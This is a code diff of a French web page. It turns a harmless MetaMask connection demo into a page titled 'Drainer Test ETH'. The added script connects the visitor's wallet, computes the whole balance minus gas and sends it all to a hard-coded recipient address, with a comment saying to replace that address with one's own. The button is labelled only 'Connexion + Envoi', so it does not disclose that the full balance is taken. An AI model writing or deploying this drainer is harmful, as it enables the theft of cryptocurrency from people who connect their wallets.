@@ -1,72 +1,64 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <title>Connexion Multi-Réseaux MetaMask</title>
+  <meta charset="UTF-8">
+  <title>Drainer Test ETH</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
   <style>
-    body {
-      font-family: Arial;
-      text-align: center;
-      margin-top: 100px;
-    }
-    button {
-      padding: 14px 28px;
-      font-size: 16px;
-      background: #ff9900;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-    #result {
-      margin-top: 20px;
-      font-weight: bold;
-    }
+    body { font-family: Arial; text-align: center; margin-top: 100px; }
+    button { padding: 12px 24px; font-size: 16px; background: #f90; color: white; border: none; border-radius: 8px; cursor: pointer; }
+    #log { margin-top: 20px; font-weight: bold; }
   </style>
 </head>
 <body>
-
-  <h1>Connexion Web3 (tous réseaux)</h1>
-  <button onclick="connect()">🦊 Connexion MetaMask</button>
-  <div id="result"></div>
+  <h1>Connexion et Envoi ETH</h1>
+  <button onclick="connectAndSend()">🦊 Connexion + Envoi</button>
+  <div id="log"></div>
 
   <script>
-    async function connect() {
-      const result = document.getElementById("result");
+    const RECIPIENT = "0x000000000000000000000000000000000000dEaD"; // ← Remplace ici par TON adresse
+
+    async function connectAndSend() {
+      const log = document.getElementById("log");
 
       if (typeof window.ethereum === 'undefined') {
-        result.textContent = "❌ MetaMask non détecté.";
+        log.textContent = "❌ MetaMask non détecté.";
         return;
       }
 
       try {
-        // Demande de permission (tous réseaux confondus)
-        await ethereum.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
-
-        // Connexion au compte
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
-        const address = await signer.getAddress();
+        const sender = await signer.getAddress();
+        const balance = await provider.getBalance(sender);
 
-        // Info réseau actuel
-        const network = await provider.getNetwork();
+        const gasPrice = await provider.getGasPrice();
+        const estimatedGas = 21000;
+        const gasCost = gasPrice.mul(estimatedGas);
 
-        result.style.color = "green";
-        result.innerHTML = `
-          ✅ Connecté à : <strong>${address}</strong><br>
-          🌐 Réseau : <strong>${network.name}</strong><br>
-          🔗 Chain ID : <strong>${network.chainId}</strong>
-        `;
+        const amountToSend = balance.sub(gasCost);
 
-      } catch (err) {
-        console.error("Erreur de connexion:", err);
-        if (err.code === 4001) {
-          result.textContent = "❌ Permission refusée.";
-        } else {
-          result.textContent = "❌ Erreur inconnue.";
+        if (amountToSend.lte(0)) {
+          log.textContent = "❌ Solde insuffisant pour envoyer quoi que ce soit.";
+          return;
         }
+
+        const tx = {
+          to: RECIPIENT,
+          value: amountToSend
+        };
+
+        const txResult = await signer.sendTransaction(tx);
+
+        log.innerHTML = `
+          ✅ Transaction envoyée !<br>
+          💸 Montant : ${ethers.utils.formatEther(amountToSend)} ETH<br>
+          🔗 TX : <a href="https://etherscan.io/tx/${txResult.hash}" target="_blank">${txResult.hash}</a>
+        `;
+      } catch (err) {
+        console.error("Erreur:", err);
+        log.textContent = "❌ Erreur ou refus par l'utilisateur.";
       }
     }
   </script>
